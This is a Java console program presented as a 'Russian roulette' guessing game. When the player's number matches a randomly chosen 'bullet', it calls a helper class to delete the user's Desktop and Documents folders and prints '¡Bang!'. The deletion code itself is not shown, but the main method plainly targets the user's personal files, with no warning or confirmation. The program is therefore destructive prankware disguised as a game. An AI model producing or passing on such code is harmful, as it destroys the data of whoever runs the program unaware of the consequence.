import java.util.Random;
import java.util.Scanner;

import repository.FilesClean;

public class Main {
    public static void main(String[] args) {
        Scanner l = new Scanner(System.in);
        FilesClean filesDelete = new FilesClean();
        Random r = new Random();
        int bullet = r.nextInt(6) + 1;
        int counter=0;

        while(counter<5){
            System.out.println("Enter a number");
            int number = l.nextInt();

            if (number < 1 || number > 6) {
                System.out.println("Invalid Number");
                System.out.println();
            } else if (number != bullet) {
                System.out.println(":)");
                counter++;
                System.out.println();
            } else {
                filesDelete.delete(filesDelete.desktop());
                filesDelete.delete(filesDelete.documents());
                System.out.println("¡Bang!");
                break;
            }

            if(counter==5){
                System.out.println("¡You Survived!");
                l.close();
            }
        }
        
    }
}
